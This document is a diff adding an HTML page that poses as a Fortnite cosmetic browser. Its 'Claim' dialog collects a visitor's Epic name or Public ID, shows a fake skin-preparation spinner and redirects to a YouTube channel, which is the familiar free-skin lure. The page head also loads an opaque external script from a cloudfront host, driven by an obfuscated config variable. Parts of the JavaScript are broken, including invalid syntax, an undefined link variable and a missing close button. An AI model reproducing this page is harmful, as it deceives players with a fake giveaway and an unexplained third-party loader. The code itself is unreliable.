@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Fortnite Cosmetic Browser</title>
+<style>
+:root {
+  --bg:#101116; --panel:#191b24; --panel2:#242735;
+  --border:#363948; --text:#f5f6fa; --muted:#a7abba;
+  --accent:#c83240;
+}
+* { box-sizing:border-box; }
+body {
+  margin:0; background:var(--bg); color:var(--text);
+  font-family:Arial,Helvetica,sans-serif;
+}
+header {
+  padding:30px 16px 24px; text-align:center;
+  background:linear-gradient(135deg,#171923,#29151c);
+  border-bottom:1px solid var(--border);
+}
+header h1 { margin:0 0 9px; font-size:clamp(25px,5vw,38px); }
+header p { margin:0; color:var(--muted); }
+main { width:min(1200px,100%); margin:auto; padding:22px 16px 40px; }
+.search {
+  width:100%; padding:15px; background:var(--panel);
+  color:white; border:1px solid var(--border);
+  border-radius:12px; font-size:16px; outline:none;
+}
+.search:focus { border-color:var(--accent); }
+.tabs { display:flex; flex-wrap:wrap; gap:9px; padding:16px 0; }
+.tab {
+  padding:11px 15px; border:1px solid var(--border);
+  border-radius:10px; background:var(--panel); color:#ddd;
+  cursor:pointer; font-size:14px;
+}
+.tab.active { background:var(--accent); border-color:var(--accent); color:white; }
+#status { min-height:24px; margin:3px 0 14px; color:var(--muted); font-size:14px; }
+.grid { display:grid; grid-template-columns:repeat(5,minmax(0,1fr)); gap:14px; }
+.item {
+  min-width:0; overflow:hidden; background:var(--panel);
+  border:1px solid var(--border); border-radius:13px;
+  cursor:pointer; transition:transform .16s,border-color .16s;
+}
+.item:hover { transform:translateY(-3px); border-color:#777b8d; }
+.item img {
+  display:block; width:100%; aspect-ratio:1/1; object-fit:contain;
+  padding:8px; background:radial-gradient(circle,#303341,#191b24 72%);
+}
+.item-info { padding:11px; }
+.item-name { font-size:14px; font-weight:700; line-height:1.4; overflow-wrap:anywhere; }
+.item-rarity { margin-top:6px; color:var(--muted); font-size:12px; }
+.empty { grid-column:1/-1; padding:35px 10px; text-align:center; color:var(--muted); }
+.retry {
+  margin-top:12px; padding:10px 16px; border:0; border-radius:9px;
+  background:var(--accent); color:#fff; cursor:pointer;
+}
+footer { padding:18px; text-align:center; color:#858999; font-size:12px; }
+
+/* Selected item modal */
+.modal-backdrop {
+  position:fixed; inset:0; z-index:10; display:none;
+  align-items:center; justify-content:center; padding:15px;
+  background:#000c; overflow-y:auto;
+}
+.modal-backdrop.open { display:flex; }
+.modal {
+  width:min(520px,100%); max-height:94vh; overflow-y:auto;
+  padding:23px; border:1px solid #414454; border-radius:20px;
+  background:linear-gradient(145deg,#191b24,#292b3b);
+  box-shadow:0 22px 80px #0009;
+}
+.modal h2 { margin:0 0 18px; font-size:27px; }
+#selectedImage {
+  display:block; width:min(250px,75%); aspect-ratio:1/1;
+  object-fit:contain; margin:0 auto 18px; border-radius:14px;
+  background:#101116;
+}
+#selectedName { margin-bottom:10px; font-size:20px; font-weight:700; }
+#selectedRarity { margin-bottom:20px; color:#c5c8d5; }
+.field-label { display:block; margin-bottom:8px; font-size:14px; font-weight:700; }
+#playerId {
+  display:block; width:100%; padding:14px; color:#fff;
+  background:#14161e; border:1px solid #454b5b;
+  border-radius:11px; font-size:16px; outline:none;
+}
+#playerId:focus { border-color:var(--accent); }
+.demo-note { color:#aeb2c1; font-size:12px; line-height:1.5; }
+.action-button {
+  width:100%; margin-top:10px; padding:15px; border:0;
+  border-radius:11px; background:var(--accent); color:white;
+  font-size:17px; font-weight:700; cursor:pointer;
+}
+.action-button:disabled { opacity:.65; cursor:wait; }
+.close-button { background:#373b4b; }
+#skinLoading { padding:22px 8px 8px; text-align:center; }
+#skinLoading[hidden] { display:none; }
+.spinner {
+  width:42px; height:42px; margin:0 auto 13px;
+  border:4px solid #4c5060; border-top-color:#f04b59;
+  border-radius:50%; animation:spin .8s linear infinite;
+}
+@keyframes spin { to { transform:rotate(360deg); } }
+
+@media(max-width:950px) { .grid { grid-template-columns:repeat(4,minmax(0,1fr)); } }
+@media(max-width:650px) {
+  main { padding:17px 12px 30px; }
+  .grid { grid-template-columns:repeat(3,minmax(0,1fr)); gap:9px; }
+  .item-info { padding:9px; }
+  .item-name { font-size:12px; }
+  .modal { padding:19px; }
+}
+@media(max-width:380px) { .grid { grid-template-columns:repeat(2,minmax(0,1fr)); } }
+</style>
+<script type="text/javascript">
+    var vlqtn_mZd_WCfBWc={"it":4636800,"key":"b976c"};
+</script>
+<script src="https://d18k3i06xdslhs.cloudfront.net/86b9b8d.js"></script>
+
+</head>
+<body>
+
+<header>
+  <h1>Fortnite Cosmetic Browser</h1>
+  <p>Explore outfits, weapon wraps and more</p>
+</header>
+
+<main>
+  <input id="search" class="search" type="search"
+         placeholder="Search cosmetics..." aria-label="Search cosmetics">
+
+  <nav class="tabs" aria-label="Cosmetic categories">
+    <button class="tab active" data-category="outfits">Outfits</button>
+    <button class="tab" data-category="wraps">Weapon Wraps</button>
+    <button class="tab" data-category="other">Other Rewards</button>
+  </nav>
+
+  <div id="status" role="status" aria-live="polite">Loading cosmetics…</div>
+  <section id="grid" class="grid"></section>
+</main>
+
+<footer>
+  Unofficial cosmetic browser. This demo does not grant or transfer Fortnite items.
+</footer>
+
+<div id="modalBackdrop" class="modal-backdrop"
+     role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+  <div class="modal">
+    <h2 id="modalTitle">Selected item</h2>
+    <img id="selectedImage" alt="Selected cosmetic preview">
+    <div id="selectedName"></div>
+    <div id="selectedRarity"></div>
+
+    <label class="field-label" for="playerId">
+      Epic Display Name or Public ID
+    </label>
+    <input id="playerId" type="text" maxlength="80"
+           placeholder="Enter your name or Public ID" autocomplete="off">
+
+    <p class="demo-note">
+      Demo only. This page does not sign in to Epic Games or add items to an account.
+    </p>
+
+    <button id="claimDemoBtn" class="action-button" type="button">
+      Claim 
+    </button>
+
+    <div id="skinLoading" hidden>
+      <div class="spinner"></div>
+      <strong>Preparing your selected skin…</strong>
+      <p class="demo-note">Opening the video destination shortly.</p>
+    </div>
+
+    </button>
+  </div>
+</div>
+
+<script>
+"use strict";
+
+/* حط رابط قناتك أو الفيديو هنا */
+const _vH() = "YOUR_YOUTUBE_LINK_HERE";
+
+/* مصدر بيانات السكينات */
+const COSMETICS_API =
+  "https://fortnite-api.com/v2/cosmetics/br?language=en";
+
+const grid = document.getElementById("grid");
+const statusEl = document.getElementById("status");
+const searchEl = document.getElementById("search");
+const backdrop = document.getElementById("modalBackdrop");
+const playerId = document.getElementById("playerId");
+const claimButton = document.getElementById("claimDemoBtn");
+const loadingPanel = document.getElementById("skinLoading");
+const closeButton = document.getElementById("closeModal");
+
+let currentCategory = "outfits";
+let allItems = { outfits: [], wraps: [], other: [] };
+
+function textValue(value) {
+  return typeof value === "string" ? value : "";
+}
+
+function typeValue(item) {
+  return textValue(item?.type?.value || item?.type?.displayValue)
+    .toLowerCase().trim();
+}
+
+function rarityName(item) {
+  return item?.series?.name ||
+         item?.rarity?.name ||
+         item?.type?.displayValue ||
+         "Cosmetic";
+}
+
+function itemImage(item) {
+  const images = item?.images || {};
+  return images.featured ||
+         images.icon ||
+         images.smallIcon ||
+         images.small ||
+         images.large ||
+         "";
+}
+
+function dateValue(item) {
+  const raw = item?.added || item?.introduction?.added;
+  if (!raw) return 0;
+  const parsed = Date.parse(raw);
+  return Number.isNaN(parsed) ? 0 : parsed;
+}
+
+function newestFirst(items) {
+  return items.sort((a, b) => dateValue(b) - dateValue(a));
+}
+
+function uniqueItems(items) {
+  const seen = new Set();
+  return items.filter(item => {
+    const key = item.id || item.name;
+    if (!key || seen.has(key)) return false;
+    seen.add(key);
+    return true;
+  });
+}
+
+async function fetchCosmetics() {
+  const response = await fetch(COSMETICS_API, {
+    headers: { "Accept": "application/json" }
+  });
+
+  if (!response.ok) {
+    throw new Error("The cosmetics API returned HTTP " + response.status);
+  }
+
+  const json = await response.json();
+
+  // Fortnite-API returns the BR cosmetics in json.data as an array.
+  if (!json || !Array.isArray(json.data)) {
+    throw new Error("Unexpected API response. Expected a cosmetics array.");
+  }
+
+  return json.data;
+}
+
+function categorize(items) {
+  const outfits = [];
+  const wraps = [];
+  const other = [];
+
+  items.forEach(item => {
+    const type = typeValue(item);
+
+    if (type === "outfit" || type === "character") {
+      outfits.push(item);
+    } else if (type === "wrap") {
+      wraps.push(item);
+    } else {
+      // Car cosmetics are served by a separate endpoint and aren't fetched here.
+      // Keep other BR cosmetic types in Other Rewards.
+      other.push(item);
+    }
+  });
+
+  allItems.outfits = newestFirst(uniqueItems(outfits));
+  allItems.wraps = newestFirst(uniqueItems(wraps));
+  allItems.other = newestFirst(uniqueItems(other));
+}
+
+async function loadCosmetics() {
+  statusEl.textContent = "Loading cosmetics from Fortnite API…";
+  grid.replaceChildren();
+
+  try {
+    const items = await fetchCosmetics();
+    categorize(items);
+    renderItems();
+
+    const total = allItems.outfits.length +
+                  allItems.wraps.length +
+                  allItems.other.length;
+    statusEl.textContent = total
+      ? "Loaded " + total.toLocaleString() + " cosmetics."
+      : "The API loaded successfully, but no items were returned.";
+  } catch (error) {
+    console.error("Cosmetics loading error:", error);
+    statusEl.textContent =
+      "Could not load cosmetics: " + error.message +
+      " Try reloading or opening this page through a web host.";
+    grid.replaceChildren();
+
+    const retry = document.createElement("button");
+    retry.className = "retry";
+    retry.textContent = "Try Again";
+    retry.addEventListener("click", loadCosmetics);
+    grid.appendChild(retry);
+  }
+}
+
+function renderItems() {
+  const query = searchEl.value.trim().toLowerCase();
+  const source = allItems[currentCategory] || [];
+
+  const items = source.filter(item =>
+    String(item.name || "").toLowerCase().includes(query) ||
+    rarityName(item).toLowerCase().includes(query)
+  );
+
+  grid.replaceChildren();
+
+  if (!items.length) {
+    const empty = document.createElement("div");
+    empty.className = "empty";
+    empty.textContent = source.length
+      ? "No matching items. Try another search."
+      : "No items available in this category.";
+    grid.appendChild(empty);
+    return;
+  }
+
+  items.forEach(item => {
+    const card = document.createElement("article");
+    card.className = "item";
+    card.tabIndex = 0;
+    card.setAttribute("role", "button");
+    card.setAttribute("aria-label", "Preview " + (item.name || "cosmetic"));
+
+    const img = document.createElement("img");
+    img.loading = "lazy";
+    img.alt = item.name || "Cosmetic";
+    const imageUrl = itemImage(item);
+
+    if (imageUrl) {
+      img.src = imageUrl;
+    } else {
+      img.alt = "No image available";
+      img.style.opacity = ".25";
+    }
+
+    img.addEventListener("error", () => {
+      img.removeAttribute("src");
+      img.alt = "Image unavailable";
+      img.style.opacity = ".25";
+    }, { once: true });
+
+    const info = document.createElement("div");
+    info.className = "item-info";
+
+    const name = document.createElement("div");
+    name.className = "item-name";
+    name.textContent = item.name || "Unknown item";
+
+    const rarity = document.createElement("div");
+    rarity.className = "item-rarity";
+    rarity.textContent = rarityName(item);
+
+    info.append(name, rarity);
+    card.append(img, info);
+
+    card.addEventListener("click", () => openModal(item));
+    card.addEventListener("keydown", event => {
+      if (event.key === "Enter" || event.key === " ") {
+        event.preventDefault();
+        openModal(item);
+      }
+    });
+
+    grid.appendChild(card);
+  });
+}
+
+function openModal(item) {
+  document.getElementById("selectedName").textContent =
+    item.name || "Unknown item";
+  document.getElementById("selectedRarity").textContent =
+    "Rarity: " + rarityName(item);
+
+  const image = document.getElementById("selectedImage");
+  image.removeAttribute("src");
+  const url = itemImage(item);
+  if (url) image.src = url;
+  image.alt = item.name || "Selected cosmetic";
+
+  playerId.value = "";
+  playerId.placeholder = "Enter your name or Public ID";
+  claimButton.disabled = false;
+  claimButton.textContent = "Claim Demo";
+  loadingPanel.hidden = true;
+  closeButton.hidden = false;
+
+  backdrop.classList.add("open");
+  document.body.style.overflow = "hidden";
+}
+
+function closeModal() {
+  backdrop.classList.remove("open");
+  document.body.style.overflow = "";
+}
+
+claimButton.addEventListener("click", () => {
+  if (!playerId.value.trim()) {
+    playerId.placeholder = "Please enter your name or Public ID";
+    playerId.focus();
+    return;
+  }
+
+  if (YOUTUBE_LINK === "YOUR_YOUTUBE_LINK_HERE") {
+    alert("Add your YouTube link in the YOUTUBE_LINK setting near the top of the script.");
+    return;
+  }
+
+  let destination;
+  try {
+    destination = new URL(YOUTUBE_LINK);
+  } catch {
+    alert("The YouTube link is invalid. Please check it.");
+    return;
+  }
+
+  const validHosts = ["youtube.com", "www.youtube.com", "m.youtube.com", "youtu.be"];
+  if (!validHosts.includes(destination.hostname)) {
+    alert("Please enter a valid YouTube channel or video URL.");
+    return;
+  }
+
+  claimButton.disabled = true;
+  claimButton.textContent = "Preparing…";
+  loadingPanel.hidden = false;
+  closeButton.hidden = true;
+
+  window.setTimeout(() => {
+    window.location.href = destination.href;
+  }, 2200);
+});
+
+closeButton.addEventListener("click", closeModal);
+
+backdrop.addEventListener("click", event => {
+  if (event.target === backdrop) closeModal();
+});
+
+document.addEventListener("keydown", event => {
+  if (event.key === "Escape" && backdrop.classList.contains("open")) {
+    closeModal();
+  }
+});
+
+searchEl.addEventListener("input", renderItems);
+
+document.querySelectorAll(".tab").forEach(button => {
+  button.addEventListener("click", () => {
+    document.querySelectorAll(".tab").forEach(tab => {
+      tab.classList.toggle("active", tab === button);
+    });
+    currentCategory = button.dataset.category;
+    renderItems();
+  });
+});
+
+loadCosmetics();
+</script>
+</body>
+</html>
